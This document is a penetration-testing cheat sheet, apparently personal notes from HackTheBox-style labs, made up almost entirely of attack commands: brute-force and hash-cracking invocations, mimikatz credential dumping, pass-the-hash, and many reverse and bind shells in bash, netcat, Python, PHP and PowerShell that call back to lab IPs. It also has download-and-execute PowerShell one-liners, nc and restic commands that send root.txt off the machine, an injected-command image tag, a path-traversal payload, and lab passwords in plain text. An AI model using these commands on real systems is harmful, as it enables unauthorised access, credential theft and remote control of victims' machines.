[TOC]



# Discovery

### PORT SCAN

```bash
#NMAP
nmap -sC -sV -oA name <ip>
#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
#Mascan
masscan -sS --ports 0-65535 192.168.23.109 -e tun1
```

# Enumeration

### WEB

```bash
$ ./dirsearch.py -u https://thehub.buzzfeed.com/ -e php,asp,txt -t 40
$ ffuf -c -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://worker.htb/ -H “Host: FUZZ.worker.htb” -fs 185
$ gobuster dir -u bank.htb -w /usr/share/wordlists/dirb/common.txt
```

### GIT Leak

```bash
root@kali:~/tools/GitTools/Dumper# ./gitdumper.sh https://source.cereal.htb/.git/ ../out/
root@kali:~/tools/GitTools/Dumper# ./Extractor/extractor.sh ./out/ ./out_code/
```

# Passwords

### Crowbar - rdp

```bash
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```



### Hydra - ssh

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -L user.txt -P passwords.txt ssh://127.0.0.1
```



### Hydra - WEB

```bash
$ hydra 10.11.0.22 http-form-post "/form/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.10.209 -s 8089 http-head /services -S -F
```



Ncrack -RDP

```bash
ncrack -vv --user svclient08 -P /usr/share/wordlist rdp://10.11.1.24
```



### Medusa

```bash
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```



### mimikatz.exe

```
C:\> C:\temp\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```



### Cracking

```bash
hashid 'HASH_HERE'
john hash.txt --format=NT
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

python ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```



### PassTheHash

```bash
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd

```



# Tunneling

### Port Forwarding - Rinetd

```bash
nano /etc/rinetd.conf
# bindadress bindport connectaddress connectport
0.0.0.0 80 10.11.1.50 80
# every traffic on 0.0.0.0:80 will be redirected to 10.11.1.50:80
sudo service rinetd restart
```



### Local Port Forward

```bash
$ ssh -N -L [local_listen_port]:[target_ip]:[target_port] [username@address]
$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
#Any traffic on our KAli on port=445 -> will be forwarded to 192.168.1.110 on port=445 across SSH Tunnel on 10.11.0.128
$ smbclient -L 127.0.0.1 -U Administrator
#smbclient will connect to 192.168.1.110 by tunnel
```

### Remote Port Forward

```bash
$ ssh -N -R [bind_address:]port:host:hostport [username@address]
$ ssh -N -R 10.10.10.212:4566:127.0.0.1:4566 karoyli@10.10.10.212
#Any traffic on 10.11.0.4:2221 will be forwarded to 127.0.0.1:3306 (ssh client) over SSH Tunnel
```

### Dynamic Port Forward

```bash
$ ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
$ cat /etc/proxychains.conf 
socks4 127.0.0.1 8080
$ proxychains <Command Targetting what 10.11.0.128 caan see>
```

### Plink

```bash
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

### Nitch

```bash
$ netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
$ netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```

### Others

```
sshuttle -r root@<target_ip> 10.2.2.0/24
```

```
plink -R 2020:localhost:2020 root@10.10.16.31 -pw "toor"
```

```
dbclient -i .k -f -N -R 8888:172.19.0.4:80 dummy@10.10.14.14
```

### Without SSH

* #### portfwd

```
portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
```

* #### Autoroute

```
msf post(multi/manage/autoroute)
```



# Web Listeners

```
php -S 0.0.0.0:8000
python3 -m http.server 7331
python -m SimpleHTTPServer 7331
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```

# Shell

### Bash

```shell
#!/bin/bash
/bin/bash -c "/bin/bash &>/dev/tcp/10.10.16.86/443 <&1"

/bin/sh -i >& /dev/tcp/10.10.16.86/4433 0>&1

<img src=http://10.10.14.ip/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.16.37'$IFS'443')>

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

### nc

```shell
/bin/nc -e /bin/sh 10.10.16.37 443
/bin/nc 10.10.16.12 4433 -e /bin/bash
/bin/nc 10.10.16.31 4444 < /root/root.txt
rm /tmp/fo;mkfifo /tmp/fo;cat /tmp/fo|/bin/sh -i 2>&1|nc 10.10.16.31 443 >/tmp/fo
```

### Socat

##### Revers_shell

```
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

##### File_transfer

```bash
socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

##### Bind_shell_encrypted

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 2 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash
socat - OPENSSL:10.11.0.4:443,verify=0
```



### PowerCat

##### Instal

```
. .\powercat.ps1
```

##### File_transfer

```
sudo nc -lnvp 443 > receiving_powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

##### Reverse_shell

```
sudo nc -lvp 443
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

##### Bind_shell

```
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443
```

##### Stand_alone

```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps1
powershell.exe -E <encoded>
```

### php

```php
GIF89a
<?php echo system($_GET); ?>
<?php exec("nc 10.10.16.86 443 -e bash")?>
  
/bin/php -r '$sock=fsockopen("10.10.16.104",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### java

```java
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

### python

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



### find

```shell
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
```



### MSF

```
use exploit/windows/misc/hta_server
mshta.exe http://10.10.10.204:80/IXhduoRTQtPZ.hta
```



# Windows

### Generic

```
enum4linux -a IP

Get-Service
netstat -aon | find /i "listening"

(new-object System.Net.WebClient).DownloadFile('http://10.10.16.12:8000/shellbowny.bat','C:\xampp\htdocs\omrs\naser.php')


net user pwn
runas /user:pwn\Administrator cmd.exe
```



### powershell

```powershell
powershell.exe (new-object System.Net.WebClient).DownloadFile('http://10.10.16.125/GenericPotato.exe','.\GenericPotato.exe')

/c powershell Invoke-Webrequest -OutFile C:\temp\peas.bat -Uri http://10.10.16.37:8000/winPEAS.bat ” –v
 
iex(new-object net.webclient).downloadstring('http://10.10.16.125:8000/Invoke-Mimikatz.ps1')

powershell.exe -nop -w hidden -e <BASE64-UTF-16>

Enter-PSSession -ComputerName 10.10.16.125 -credential @Cred -Authentication Negotiate

$user = "app\"
$pass = "mesh5143" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$pass
Invoke-Command -Computer htb.local -Credential $cred -ScriptBlock { cmd.exe "/c C:\Users\henry.vinson_adm\Documents\nc64.exe -e powershell.exe 10.10.16.125 4444"} 

C:\Users\shaun\Documents\nc.exe 10.10.16.31 8080 -e powershell.exe


reverse_shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.86',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.86',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



bind_shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"
```



### AD

```
./kerbrute.py -user Administrator -dc-ip 10.10.10.175 -domain EGOTISTICALBANK -passwords /usr/share/wordlists/rockyou.txt -threads 10

./GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICALBANK/svc_loanmgr -no-pass -format john -outputfile naser.txt

john --wordlist=/usr/share/wordlists/rockyou.txt naser.txt 


Pass the hash
impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@sauna.htb

metasploit psexec
```



### Winrm

ports:5985-5986

```
ruby evil-winrm.rb -i control.htb -u hector -p l3tm3!n
```



### NFC

port 111

```
nmap -sV -p 111 --script=rpcinfo <ip>  --script nfs*

```





### SMB

Port 139 and 445- SMB/Samba shares

Samba is a service that enables the user to share files with other machines

works the same as a command line FTP client, may browse files without even having credentials

```bash
smbmap -H 192.168.1.13 -R -u Nadine -p L1k3B1gBut7s@W0rk
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
nmblookup -A 10.10.10.151
nbtscan 10.10.10.185

mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share

smbclient -N -L 10.10.10.169
smbclient -N -L 10.10.10.175 -U EGOTISTICALBANK/administrator
smbclient \\\\<targetip>\\ShareName

#smbclient \\\\<targetip>\\ShareName -U john
#smb: \> recurse ON
#smb: \> prompt OFF
#smb: \> mget *

spray.sh -smb IP <users.txt> <passwords.txt> 0 0 <DOMAIN>

\# Check SMB vulnerabilities:
nmap --script=smb-check-vulns.nse <targetip> -p445

\# scan for vulnerabilities with nmap
nmap --script "vuln" <targetip> -p139,445

\# basic nmap scripts to enumerate shares and OS discovery
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse

\# Connect using Username
root@kali:~# smbclient -L <targetip> -U username -p 445

\# enumarete with smb-shares, -a “do everything” option
enum4linux -a 192.168.1.120

\# learn the machine name and then enumerate with smbclient
nmblookup -A 192.168.1.102
smbclient -L <server_name> -I 192.168.1.105

\# rpcclient - Connect with a null-session (only works for older windows servers)
rpcclient -U james 10.10.10.52
rpcclient -U "" 192.168.1.105
(press enter if asks for a password)

rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient $> querydispinfo
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john
rpcclient> enumprinters
```



```bash
# crackmapexec smb fuse.fabricorp.local -u users.txt -p "Fabricorp01"
```



### SNMB

```
#SNMP-Check
snmp-check ip
snmp-check $IP
snmpcheck -t $IP -c public
snmpcheck -t ip.X -c public

#onesixtyone
onesixtyone -c names -i hosts

#SNMPWALK
snmpwalk -c public -v1 $IP

#SNMPENUM
perl snmpenum.pl $IP public windows.txt

#NMAP SCRIPTS
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/SecLists/Usernames/top_shortlist.txt x.x.x.x
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $IP
nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP
```



### PrivEsc

```
searchsploit linux kernel 2.6 | grep 'Cent'
gcc -m32 -Wall -o exploit exp.c -Wl,--hash-style=both


.\ack.exe "Administrator" -Kvuqw hklm\system\CurrentControlSet\services

.\achk.exe -kns HKLM\system\CurrentControlSet\services\3ware

reg query "HKLM\system\CurrentControlSet\services\3ware" /v "ImagePath"

.\ack.exe "Everyone" -kvuqsw HKLM\system\CurrentControlSet\services
```



# general

```
netstat -tulpn | grep LISTEN
ps -aux | grep root

ssh -L 8000:127.0.0.1:8000 alexa@10.10.10.163 -N
ssh -L 52846:127.0.0.1:4444 root@10.10.16.43 -N -f

curl -X POST -F username=admin -F password=admin http://localhost:52846 

$EXEC("ls -l")

sudo restic -r rest:http://10.10.15.203:8000/ backup /root/root.txt --password-file 'naser.txt'


FTP:
 wget -r ftp://anonymous:anonymous@servmon.htb/
 
 
#gitlab lfi
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/VERSION)
```





# References 

[Sql Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)

[Crack](https://crackstation.net/)

[CyberChef](https://gchq.github.io/CyberChef/)



